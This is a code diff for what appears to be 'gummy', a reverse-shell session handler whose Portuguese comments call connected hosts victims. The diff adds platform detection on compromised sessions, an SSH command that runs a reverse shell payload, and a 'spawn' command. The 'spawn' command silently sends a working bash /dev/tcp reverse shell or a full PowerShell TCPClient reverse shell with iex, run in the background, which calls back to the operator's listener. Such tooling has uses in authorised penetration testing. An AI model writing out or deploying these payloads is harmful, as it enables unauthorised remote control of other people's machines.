@@ -17,6 +17,7 @@ import (
 
 	"github.com/chsoares/gummy/internal/payloads"
 	"github.com/chsoares/gummy/internal/shell"
+	"github.com/chsoares/gummy/internal/ssh"
 	"github.com/chsoares/gummy/internal/transfer"
 	"github.com/chsoares/gummy/internal/ui"
 	"github.com/chzyer/readline"
@@ -43,6 +44,7 @@ type SessionInfo struct {
 	Conn     net.Conn       // Conexão TCP
 	RemoteIP string         // IP da vítima
 	Whoami   string         // user@host da vítima
+	Platform string         // Plataforma (linux/windows/unknown)
 	Handler  *shell.Handler // Shell handler
 	Active   bool           // Se está sendo usada atualmente
 }
@@ -57,7 +59,7 @@ func (c *GummyCompleter) Do(line []rune, pos int) (newLine [][]rune, length int)
 	lineStr := string(line[:pos])
 	trimmed := strings.TrimLeft(lineStr, " \t")
 
-	commands := []string{"upload", "download", "list", "use", "shell", "kill", "help", "exit", "clear"}
+	commands := []string{"upload", "download", "list", "use", "shell", "kill", "help", "exit", "clear", "ssh", "rev", "spawn"}
 
 	// Nothing typed yet, show all commands
 	if trimmed == "" {
@@ -299,6 +301,7 @@ func (m *Manager) AddSession(id string, conn net.Conn, remoteIP string) {
 		Conn:     conn,
 		RemoteIP: remoteIP,
 		Whoami:   "detecting...",
+		Platform: "detecting...",
 		Handler:  handler,
 		Active:   false,
 	}
@@ -306,8 +309,8 @@ func (m *Manager) AddSession(id string, conn net.Conn, remoteIP string) {
 	m.sessions[id] = session
 	m.nextID++
 
-	// Detecta whoami em background
-	go m.detectWhoami(session)
+	// Detecta whoami e platform em background
+	go m.detectSessionInfo(session)
 
 	// Inicia monitoramento da sessão
 	go m.monitorSession(session)
@@ -350,7 +353,7 @@ func (m *Manager) RemoveSession(id string) {
 		if len(m.sessions) > 0 {
 			m.showMenu()
 		} else {
-			fmt.Println("No active sessions.")
+			fmt.Println("No active sessions")
 		}
 	}
 }
@@ -361,13 +364,13 @@ func (m *Manager) ListSessions() {
 	defer m.mu.RUnlock()
 
 	if len(m.sessions) == 0 {
-		fmt.Println(ui.Info("No active sessions."))
+		fmt.Println(ui.Info("No active sessions"))
 		return
 	}
 
 	// Collect all session lines
 	var lines []string
-	lines = append(lines, ui.TableHeader("id  remote address     whoami"))
+	lines = append(lines, ui.TableHeader("id  remote address     whoami                    platform"))
 
 	// Ordenar por NumID para exibição consistente
 	var sessions []*SessionInfo
@@ -379,7 +382,7 @@ func (m *Manager) ListSessions() {
 	})
 
 	for _, session := range sessions {
-		sessionLine := fmt.Sprintf("%-3d %-18s %s", session.NumID, session.RemoteIP, session.Whoami)
+		sessionLine := fmt.Sprintf("%-3d %-18s %-25s %s", session.NumID, session.RemoteIP, session.Whoami, session.Platform)
 		if session.Active {
 			lines = append(lines, ui.SessionActive(sessionLine))
 		} else {
@@ -467,16 +470,19 @@ func (m *Manager) KillSession(numID int) error {
 	return nil
 }
 
-// detectWhoami detecta user@host da sessão em background
-func (m *Manager) detectWhoami(session *SessionInfo) {
+// detectSessionInfo detecta user@host e plataforma da sessão em background
+func (m *Manager) detectSessionInfo(session *SessionInfo) {
 	// Aguarda um pouco para a shell se estabilizar
 	time.Sleep(800 * time.Millisecond)
 
-	// Comando mais direto e confiável
-	whoamiCmd := "echo $(whoami)@$(hostname)\n"
-	_, err := session.Conn.Write([]byte(whoamiCmd))
+	// Comando que funciona tanto em Linux quanto Windows
+	// Linux: retorna user@host e "linux"
+	// Windows: retorna username@computername e "windows"
+	detectionCmd := "echo $(whoami)@$(hostname) 2>/dev/null || echo %USERNAME%@%COMPUTERNAME%; uname 2>/dev/null || echo windows\n"
+	_, err := session.Conn.Write([]byte(detectionCmd))
 	if err != nil {
 		session.Whoami = "unknown"
+		session.Platform = "unknown"
 		return
 	}
 
@@ -486,6 +492,8 @@ func (m *Manager) detectWhoami(session *SessionInfo) {
 	// Lê toda a resposta em múltiplas tentativas
 	allData := ""
 	buffer := make([]byte, 1024)
+	foundWhoami := false
+	foundPlatform := false
 
 	for i := 0; i < 10; i++ { // máximo 10 tentativas
 		n, err := session.Conn.Read(buffer)
@@ -494,6 +502,7 @@ func (m *Manager) detectWhoami(session *SessionInfo) {
 				break
 			}
 			session.Whoami = "unknown"
+			session.Platform = "unknown"
 			return
 		}
 
@@ -504,12 +513,16 @@ func (m *Manager) detectWhoami(session *SessionInfo) {
 			lines := strings.Split(allData, "\n")
 			for _, line := range lines {
 				line = strings.TrimSpace(line)
-				// Procura por user@host sem comandos
-				if strings.Contains(line, "@") &&
+
+				// Detecta whoami
+				if !foundWhoami && strings.Contains(line, "@") &&
 					!strings.Contains(line, "echo") &&
 					!strings.Contains(line, "whoami") &&
 					!strings.Contains(line, "hostname") &&
-					!strings.Contains(line, "$") {
+					!strings.Contains(line, "USERNAME") &&
+					!strings.Contains(line, "COMPUTERNAME") &&
+					!strings.Contains(line, "$") &&
+					!strings.Contains(line, "%") {
 
 					// Limpa a linha
 					cleaned := strings.ReplaceAll(line, "\r", "")
@@ -519,23 +532,42 @@ func (m *Manager) detectWhoami(session *SessionInfo) {
 					parts := strings.Split(cleaned, "@")
 					if len(parts) == 2 && len(parts[0]) > 0 && len(parts[1]) > 0 && len(cleaned) < 50 {
 						session.Whoami = cleaned
-
-						// Drena o restante rapidamente
-						go func() {
-							time.Sleep(100 * time.Millisecond)
-							drainBuffer := make([]byte, 2048)
-							session.Conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
-							for {
-								n, err := session.Conn.Read(drainBuffer)
-								if err != nil || n == 0 {
-									break
-								}
-							}
-							session.Conn.SetReadDeadline(time.Time{})
-						}()
-
-						return
+						foundWhoami = true
 					}
+				}
+
+				// Detecta plataforma
+				if !foundPlatform {
+					lowerLine := strings.ToLower(line)
+					if strings.Contains(lowerLine, "linux") {
+						session.Platform = "linux"
+						foundPlatform = true
+					} else if strings.Contains(lowerLine, "windows") {
+						session.Platform = "windows"
+						foundPlatform = true
+					} else if strings.Contains(lowerLine, "darwin") {
+						session.Platform = "macos"
+						foundPlatform = true
+					}
+				}
+
+				// Se encontrou ambos, termina
+				if foundWhoami && foundPlatform {
+					// Drena o restante rapidamente
+					go func() {
+						time.Sleep(100 * time.Millisecond)
+						drainBuffer := make([]byte, 2048)
+						session.Conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
+						for {
+							n, err := session.Conn.Read(drainBuffer)
+							if err != nil || n == 0 {
+								break
+							}
+						}
+						session.Conn.SetReadDeadline(time.Time{})
+					}()
+
+					return
 				}
 			}
 		}
@@ -546,7 +578,13 @@ func (m *Manager) detectWhoami(session *SessionInfo) {
 
 	// Remove timeout
 	session.Conn.SetReadDeadline(time.Time{})
-	session.Whoami = "unknown"
+
+	if !foundWhoami {
+		session.Whoami = "unknown"
+	}
+	if !foundPlatform {
+		session.Platform = "unknown"
+	}
 }
 
 // monitorSession monitora a saúde da sessão em background
@@ -608,7 +646,8 @@ func (m *Manager) ShellSession() error {
 
 	m.mu.Unlock()
 
-	fmt.Println(ui.Info("Entering interactive shell. Press F12 to return to menu"))
+	fmt.Println(ui.Info("Entering interactive shell"))
+	fmt.Println(ui.CommandHelp("Press F12 to return to menu"))
 
 	// Inicia shell handler (bloqueia até sair)
 	err := targetSession.Handler.Start()
@@ -629,7 +668,7 @@ func (m *Manager) ShellSession() error {
 	if sessionCount > 0 {
 		m.showMenu()
 	} else {
-		fmt.Println(ui.Info("No active sessions."))
+		fmt.Println(ui.Info("No active sessions"))
 	}
 
 	return err
@@ -728,6 +767,14 @@ func (m *Manager) handleCommand(command string) {
 	switch parts[0] {
 	case "help", "h":
 		m.showHelp()
+	case "spawn":
+		m.handleSpawn()
+	case "ssh":
+		if len(parts) < 2 {
+			fmt.Println(ui.CommandHelp("Usage: ssh user@host"))
+			return
+		}
+		m.handleSSH(parts[1])
 	case "rev":
 		// Optional: rev [ip] [port]
 		ip := m.listenerIP
@@ -750,7 +797,7 @@ func (m *Manager) handleCommand(command string) {
 		m.ListSessions()
 	case "use":
 		if len(parts) < 2 {
-			fmt.Println(ui.Error("Usage: use <session_id>"))
+			fmt.Println(ui.CommandHelp("Usage: use <session_id>"))
 			return
 		}
 		numID, err := strconv.Atoi(parts[1])
@@ -766,7 +813,7 @@ func (m *Manager) handleCommand(command string) {
 		}
 	case "kill":
 		if len(parts) < 2 {
-			fmt.Println(ui.Error("Usage: kill <session_id>"))
+			fmt.Println(ui.CommandHelp("Usage: kill <session_id>"))
 			return
 		}
 		numID, err := strconv.Atoi(parts[1])
@@ -798,7 +845,7 @@ func (m *Manager) handleCommand(command string) {
 		fmt.Print("\033[2J\033[H")
 	case "upload":
 		if len(parts) < 2 {
-			fmt.Println(ui.Error("Usage: upload <local_path> [remote_path]"))
+			fmt.Println(ui.CommandHelp("Usage: upload <local_path> [remote_path]"))
 			return
 		}
 		remotePath := ""
@@ -808,7 +855,7 @@ func (m *Manager) handleCommand(command string) {
 		m.handleUpload(parts[1], remotePath)
 	case "download":
 		if len(parts) < 2 {
-			fmt.Println(ui.Error("Usage: download <remote_path> [local_path]"))
+			fmt.Println(ui.CommandHelp("Usage: download <remote_path> [local_path]"))
 			return
 		}
 		localPath := ""
@@ -834,7 +881,7 @@ func (m *Manager) showHelp() {
 	// Connect category
 	lines = append(lines, ui.CommandHelp("connect"))
 	lines = append(lines, ui.Command("rev [ip] [port]              - Generate reverse shell payloads"))
-	lines = append(lines, ui.Command("ssh                          - Generate SSH connection //TODO"))
+	lines = append(lines, ui.Command("ssh user@host                - Connect via SSH and execute reverse shell"))
 	lines = append(lines, ui.Command("winrm                        - Generate WinRM connection //TODO"))
 	lines = append(lines, "")
 
@@ -850,8 +897,8 @@ func (m *Manager) showHelp() {
 	lines = append(lines, ui.Command("shell                        - Enter interactive shell"))
 	lines = append(lines, ui.Command("upload <local> [remote]      - Upload file to remote system"))
 	lines = append(lines, ui.Command("download <remote> [local]    - Download file from remote system"))
+	lines = append(lines, ui.Command("spawn                        - Spawn new reverse shell from selected session"))
 	lines = append(lines, ui.Command("run <module>                 - Run a module //TODO"))
-	lines = append(lines, ui.Command("spawn                        - Spawn new session //TODO"))
 	lines = append(lines, "")
 
 	// Program category
@@ -1001,4 +1048,120 @@ func (m *Manager) handleRev(ip string, port int) {
 	// PowerShell payload
 	fmt.Println(ui.CommandHelp("PowerShell"))
 	fmt.Println(gen.GeneratePowerShell())
+}
+
+// handleSpawn spawns a new reverse shell from the currently selected session
+func (m *Manager) handleSpawn() {
+	// Check if there's a selected session
+	if m.selectedSession == nil {
+		fmt.Println(ui.Error("No session selected. Use 'use <id>' first."))
+		return
+	}
+
+	// Validate that we have IP and port
+	if m.listenerIP == "" {
+		fmt.Println(ui.Error("No listener IP available. This shouldn't happen!"))
+		return
+	}
+	if m.listenerPort == 0 {
+		fmt.Println(ui.Error("No listener port available. This shouldn't happen!"))
+		return
+	}
+
+	// Check platform
+	platform := m.selectedSession.Platform
+	if platform == "detecting..." || platform == "unknown" {
+		fmt.Println(ui.Warning("Platform detection incomplete. Attempting with linux payload..."))
+		platform = "linux"
+	}
+
+	// Generate platform-specific payload
+	var payload string
+	switch platform {
+	case "linux", "macos":
+		// Bash reverse shell that runs in background
+		payload = fmt.Sprintf("bash -c 'exec bash >& /dev/tcp/%s/%d 0>&1 &'\n",
+			m.listenerIP, m.listenerPort)
+	case "windows":
+		// PowerShell reverse shell (base64 encoded for reliability)
+		psScript := fmt.Sprintf("$client = New-Object System.Net.Sockets.TCPClient('%s',%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
+			m.listenerIP, m.listenerPort)
+		// Execute in background with Start-Job
+		payload = fmt.Sprintf("powershell -c \"Start-Job -ScriptBlock {%s}\"\n", psScript)
+	default:
+		fmt.Println(ui.Error(fmt.Sprintf("Unsupported platform: %s", platform)))
+		return
+	}
+
+	// Create spinner for spawn operation
+	spinner := ui.NewSpinner()
+	spinner.Start(fmt.Sprintf("Spawning new %s reverse shell...", platform))
+
+	// Send payload silently
+	_, err := m.selectedSession.Conn.Write([]byte(payload))
+	if err != nil {
+		spinner.Stop()
+		fmt.Println(ui.Error(fmt.Sprintf("Failed to send spawn command: %v", err)))
+		return
+	}
+
+	// Drain any immediate output
+	go func() {
+		time.Sleep(200 * time.Millisecond)
+		drainBuffer := make([]byte, 2048)
+		m.selectedSession.Conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
+		for {
+			n, err := m.selectedSession.Conn.Read(drainBuffer)
+			if err != nil || n == 0 {
+				break
+			}
+		}
+		m.selectedSession.Conn.SetReadDeadline(time.Time{})
+	}()
+
+	// Wait briefly for connection (max 5 seconds)
+	startTime := time.Now()
+	maxWait := 5 * time.Second
+	initialSessionCount := m.GetSessionCount()
+
+	for time.Since(startTime) < maxWait {
+		time.Sleep(200 * time.Millisecond)
+
+		// Check if new session arrived
+		if m.GetSessionCount() > initialSessionCount {
+			spinner.Stop()
+			fmt.Println(ui.Success("New session spawned successfully"))
+			return
+		}
+	}
+
+	// Timeout - but connection might still arrive later
+	spinner.Stop()
+	fmt.Println(ui.Info("Payload sent. Waiting for connection..."))
+}
+
+// handleSSH connects to a remote host via SSH and executes reverse shell payload
+func (m *Manager) handleSSH(target string) {
+	// Validate that we have IP and port
+	if m.listenerIP == "" {
+		fmt.Println(ui.Error("No listener IP available. This shouldn't happen!"))
+		return
+	}
+	if m.listenerPort == 0 {
+		fmt.Println(ui.Error("No listener port available. This shouldn't happen!"))
+		return
+	}
+
+	// Create SSH connector
+	connector := ssh.NewSSHConnector(m.listenerIP, m.listenerPort)
+
+	// Connect silently (only SSH password prompt will show)
+	err := connector.ConnectInteractive(target)
+	if err != nil {
+		fmt.Println(ui.Error(err.Error()))
+		return
+	}
+
+	// Success - session should appear in list automatically via SessionOpened()
+	fmt.Println(ui.Info("Waiting for reverse shell connection..."))
 }
